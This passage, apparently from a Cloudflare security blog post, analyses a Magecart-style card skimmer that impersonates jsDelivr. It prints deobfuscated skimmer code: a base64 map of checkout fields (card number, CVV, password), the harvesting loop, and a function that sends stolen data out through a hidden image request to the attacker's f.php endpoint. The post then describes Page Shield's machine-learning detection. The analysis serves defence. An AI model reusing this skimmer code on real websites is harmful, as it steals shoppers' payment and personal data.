The stolen data was then transmitted to a server controlled by the attackers, located at https://jsdelivr[.]at/f[.]php.</p><h2 id=\"decoding-the-malicious-domain\">Decoding the malicious domain</h2><p>Before diving deeper into the exact behaviors of a script, examining the hosted domain and its insights could already reveal valuable arguments for overall evaluation. Regarding the hosted domain <code>cdn.jsdelivr.at</code> used in this script:</p><ul><li>It was registered on 2022-04-14.</li><li>It impersonates the well-known hosting service <a href=\"https://www.jsdelivr.com/\">jsDelivr</a>, which is hosted at <code>cdn.jsdelivr.net</code>.</li><li>It was registered by 1337team Limited, a company known for providing bulletproof hosting services. These services are frequently utilized in various cybercrime campaigns due to their resilience against law enforcement actions and their ability to host illicit activities without interruption.</li><li>Previous mentions of this hosting provider, such as in a tweet by <a href=\"https://twitter.com/malwrhunterteam/status/1374703390748520448\">@malwrhunterteam</a>, highlight its involvement in cybercrime activities. This further emphasizes the reputation of 1337team Limited in the cybercriminal community and its role in facilitating malicious campaigns.</li></ul><h2 id=\"decoding-the-malicious-script\">Decoding the malicious script</h2><p>Data Encoding and Decoding Functions: The script uses two functions, <code>wvnso.jzzys</code> and <code>wvnso.cvdqe</code>, for encoding and decoding data. They employ Base64 and URL encoding techniques, common methods in malware to conceal the real nature of the data being sent.</p><pre><code class=\"language-js\">var wvnso = {\n  \"jzzys\": function (_0x5f38f3) {\n    return btoa(encodeURIComponent(_0x5f38f3).replace(/%([0-9A-F]{2})/g, function (_0x7e416, _0x1cf8ee) {\n      return String.fromCharCode('0x' + _0x1cf8ee);\n    }));\n  },\n  \"cvdqe\": function (_0x4fdcee) {\n    return decodeURIComponent(Array.prototype.map.call(atob(_0x4fdcee), function (_0x273fb1) {\n      return '%' + ('00' + _0x273fb1.charCodeAt(0x0).toString(0x10)).slice(-0x2);\n    }).join(''));\n  }\n</code></pre><p>Targeted Data Fields: The script is designed to identify and monitor specific input fields on the website. These fields include sensitive information like credit card numbers, names, email addresses, and other personal details. The <code>wvnso.cwwez</code> function maps these fields, showing that the attackers had carefully studied the website’s layout.</p><pre><code class=\"language-js\">\"cwwez\": window.JSON.parse(wvnso.cvdqe(\"W1siZmllbGQiLCAiaWZyYW1lIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsibmFtZSIsICJmaXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJuYW1lIiwgImxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsiZmllbGQiLCAiaWZyYW1lIiwgMCwgImUiLCAiRGF0ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNWViJdLCBbImlkIiwgImN1c3RvbWVyLWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsibmFtZSIsICJ0ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJuYW1lIiwgImNpdHkiLCAwLCAiY3kiLCAiY2l0eSJdLCBbIm5hbWUiLCAicmVnaW9uX2lkIiwgMywgInNlIiwgInN0YXRlIl0sIFsibmFtZSIsICJyZWdpb24iLCAwLCAic2UiLCAic3RhdGUiXSwgWyJuYW1lIiwgImNvdW50cnlfaWQiLCAwLCAiY3QiLCAiQ291bnRyeSJdLCBbIm5hbWUiLCAicG9zdGNvZGUiLCAwLCAienAiLCAiWmlwIl0sIFsiaWQiLCAiY3VzdG9tZXItcGFzc3dvcmQiLCAwLCAicGQiLCAicGFzc3dvcmQiXSwgWyJuYW1lIiwgWyJzdHJlZXRbMF0iLCAic3RyZWV0WzFdIiwgInN0cmVldFsyXSJdLCAwLCAiYXMiLCAiYWRkciJdXQ==\")),\n</code></pre><p>Data Harvesting Logic: The script uses a set of complex functions ( <code>wvnso.uvesz</code>,  <code>wvnso.wsrmf</code>, etc.) to check each targeted field for user input. When it finds the data it wants (like credit card details), it collects (\"harvests\") this data and gets it ready to be sent out (\"exfiltrated\").</p><pre><code class=\"language-js\">\"uvesz\": function (_0x52b255) {\n    for (var _0x356fbe = 0x0; _0x356fbe &lt; wvnso.cwwez.length; _0x356fbe++) {\n      var _0x25348a = wvnso.cwwez[_0x356fbe];\n      if (_0x52b255.hasAttribute(_0x25348a[0x0])) {\n        if (typeof _0x25348a[0x1] == \"object\") {\n          var _0xca9068 = '';\n          _0x25348a[0x1].forEach(function (_0x450919) {\n            var _0x907175 = document.querySelector('[' + _0x25348a[0x0] + \"=\\\"\" + _0x450919 + \"\\\"\" + ']');\n            if (_0x907175 != null &amp;&amp; wvnso.wsrmf(_0x907175, _0x25348a[0x2]).length &gt; 0x0) {\n              _0xca9068 += wvnso.wsrmf(_0x907175, _0x25348a[0x2]) + \" \";\n            }\n          });\n          wvnso.krwon[_0x25348a[0x4]] = _0xca9068.trim();\n        } else {\n          if (_0x52b255.attributes[_0x25348a[0x0]].value == _0x25348a[0x1] &amp;&amp; wvnso.wsrmf(_0x52b255, _0x25348a[0x2]).length &gt; 0x0) {\n            if (_0x25348a[0x3] == 'l') {\n              wvnso.krwon[_0x25348a[0x4]] += \" \" + wvnso.wsrmf(_0x52b255, _0x25348a[0x2]);\n            } else {\n              if (_0x25348a[0x3] == 'y') {\n                wvnso.krwon[_0x25348a[0x4]] += '/' + wvnso.wsrmf(_0x52b255, _0x25348a[0x2]);\n              } else {\n                wvnso.krwon[_0x25348a[0x4]] = wvnso.wsrmf(_0x52b255, _0x25348a[0x2]);\n              }\n            }\n          }\n        }\n      }\n    }\n  }</code></pre><p>Stealthy Data Exfiltration: After harvesting the data, the script sends it secretly to the attacker's server (located at https://jsdelivr[.]at/f[.]php). This process is done in a way that mimics normal Internet traffic, making it hard to detect. It creates an Image HTML element programmatically (not displayed to the user) and sets its src attribute to a specific URL. This URL is the attacker's server where the stolen data is sent.</p><pre><code class=\"language-js\">\"eubtc\": function () {\n    var _0x4b786d = wvnso.jzzys(window.JSON.stringify(wvnso.krwon));\n    if (wvnso.pqemy() &amp;&amp; !(wvnso.rnhok.indexOf(_0x4b786d) != -0x1)) {\n      wvnso.rnhok.push(_0x4b786d);\n      var _0x49c81a = wvnso.spyed.createElement(\"IMG\");\n      _0x49c81a.src = wvnso.cvdqe(\"aHR0cHM6Ly9qc2RlbGl2ci5hdC9mLnBocA==\") + '?hash=' + _0x4b786d;\n    }\n  }</code></pre><p>Persistent Monitoring: The script keeps a constant watch on user input. This means that any data entered into the targeted fields is captured, not just when the page first loads, but continuously as long as the user is on the page.</p><p>Execution Interval: The script is set to activate its data-collecting actions at regular intervals, as shown by the <code>window.setInterval(wvnso.bumdr, 0x1f4)</code> function call. This ensures that it constantly checks for new user input on the site.</p><pre><code class=\"language-js\">window.setInterval(wvnso.bumdr, 0x1f4);\n</code></pre><p>Local Data Storage: Interestingly, the script uses local storage methods (wvnso.hajfd, wvnso.ijltb) to keep the collected data on the user's device. This could be a way to prevent data loss in case there are issues with the Internet connection or to gather more data before sending it to the server.</p><pre><code class=\"language-js\">\"ijltb\": function () {\n    var _0x19c563 = wvnso.jzzys(window.JSON.stringify(wvnso.krwon));\n    window.localStorage.setItem(\"oybwd\", _0x19c563);\n  },\n  \"hajfd\": function () {\n    var _0x1318e0 = window.localStorage.getItem(\"oybwd\");\n    if (_0x1318e0 !== null) {\n      wvnso.krwon = window.JSON.parse(wvnso.cvdqe(_0x1318e0));\n    }\n  }</code></pre><p>This JavaScript code is a sophisticated tool for stealing sensitive information from users. It's well-crafted to avoid detection, gather detailed information, and transmit it discreetly to a remote server controlled by the attackers.</p><h2 id=\"proactive-detection\">Proactive detection</h2><p><a href=\"http://blog.cloudflare.com/detecting-magecart-style-attacks-for-pageshield\">Page Shield's existing machine learning algorithm</a> is capable of automatically detecting malicious JavaScript code. As cybercriminals evolve their attack methods, we are constantly improving our detection and defense mechanisms. An upcoming version of our ML model, an artificial neural network, has been designed to maintain high recall (i.e., identifying the many different types of malicious scripts) while also providing a low false positive rate (i.e., reducing false alerts for benign code). The new version of Page Shield's ML automatically flagged the above script as a Magecart type attack with a very high probability. In other words, our ML correctly identified a novel attack script operating in the wild! Cloudflare <a href=\"https://developers.cloudflare.com/page-shield/get-started/\">customers with Page Shield enabled</a> will soon be able to take further advantage of our latest ML's superior protection for client-side security.
